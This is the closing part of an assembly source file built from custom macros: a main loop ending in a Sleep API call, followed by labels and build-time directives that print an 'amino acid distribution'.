		_sub0001
		_nopdA
	
		_JnzUp

	_popall
	_zer0 0
	addnumber 0x6666
	_push
	CallAPI hSleep


	_zer0 0
	addnumber 1
	_JnzUp


; #####
; #####     End Main Loop
; #####
; ############################################################################
; ############################################################################
; ############################################################################


EndAminoAcids1:

; ##################################################################


display 13,10,'- - -',13,10,'displayAminoAcidDistribution:',13,10
display 		    '=============================',13,10
displayAminoAcidDistribution AminoAcidList




EndAmino:
.end start